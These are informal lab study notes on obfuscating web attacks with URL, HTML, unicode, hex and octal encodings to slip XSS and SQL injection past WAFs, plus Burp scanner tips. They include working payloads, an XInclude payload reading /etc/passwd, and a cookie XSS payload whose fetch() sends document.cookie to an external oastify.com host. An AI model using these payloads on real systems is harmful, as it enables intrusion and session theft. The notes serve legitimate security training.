# Obfuscating attacks using encoding


both clients and servers use a variety of different encodings to pass data between systems since when they want to use these data they often need to decode it first  example query param is typically URL decoded server side while content of html elemt is HTML decoded client side 


in URL encoding  & is used as a delimeter to separate params in the query string 

Browser automatically URL encode any char that may cause problem for the parsers 

- You may inject url  encoded data via URL and still be interpreted correctly  and its a bypass to the WAF
-  SQLI bypass WAF we can encode select to URL encode
- URL encode double  for bypassing WAF XSS 
- HTML encoding try hex code &#58 ``<img src=x onerror="&#x61;lert(1)">``
- HTML encoding WAF bypass  ``<a href="javascript&#00000000000058;alert(1)">Click me</a>``
- XML bypass html ENCODE ``&#x53;ELECT *``

some server perform 2 round URL decode  

XML related to HTML support char encoding 


# unicode escape

`\u003a` represents a colon we can escape it by `\u{3a}`

used in programming languages when parsing string

- ``eval("\u0061lert(1)")``
- ``<a href="javascript:\u{00000000061}alert(1)">Click me</a>``

## hex escaping

hex code is represented by `\x` 
exmaple a `\x61
- escape ``eval("\x61lert")``


## octal escaping

same as hex escpae 
a `\141`
``eval("\141lert(1)")``


## multiple encodings

``<a href="javascript:&bsol;u0061lert(1)">Click me</a>``

bosl is basically back slash we can use this html encode to by pass the \ which will execute \u0061 then this will be decoded to `a`

## SQL CHAR() function

we can obfuscate our attack using CHAR() sql  this  function accepts single decimal or hex code 

`CHAR(83)` , `CHAR(0x53)` --> `S`

`SELECT`  -> `CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)`



# Scanner
we can do a general active scan from proxy  by right click on the request and do active scan 

or we can specify a custom insertion points by right click and adding a scan selected insersion points  or send it to the intruder,
for quicker solution use scan manual insertion point extension 

# Discovering vulnerabilities quickly with targeted scanning

check the post and go for live stock check  pass it to the active scan it will detect basically XML injection

```xml
productId=%3cdpx%20xmlns%3axi%3d%22http%3a%2f%2fwww.w3.org%2f2001%2fXInclude%22%3e%3cxi%3ainclude%20href%3d%22http%3a%2f%2fslhznvva787din2u4rmi4j4e65cy0poqciz8nx.oastify.com%2ffoo%22%2f%3e%3c%2fdpx%3e&storeId=1
```

so i used this payload  Xinclude attacks 
```xml 
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```



# Lab: Scanning non-standard data structures

cookie is in clear  i used inersion point active scanner on cookie

found this 
`Cookie: session='"><svg/onload%253dfetch(`//1987gwtghw3p43mm1p1ytu4ndej573vs.oastify.com/${encodeURIComponent(document.cookie)}`)>%253aezULxEJkw6I7OLWHWaxkEOf8Y6ksGMwD`

placed a collabraor  and encodeURIComponent inside it 


`/admin/delete?username=carlos ``